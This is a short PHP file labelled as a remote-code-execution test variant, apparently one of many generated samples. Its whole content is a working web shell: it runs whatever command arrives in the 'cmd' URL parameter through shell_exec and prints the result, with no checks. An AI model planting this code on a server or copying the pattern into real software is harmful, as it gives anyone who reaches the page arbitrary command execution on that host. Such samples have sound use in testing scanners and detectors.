<?php
// RCE test variation #658
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>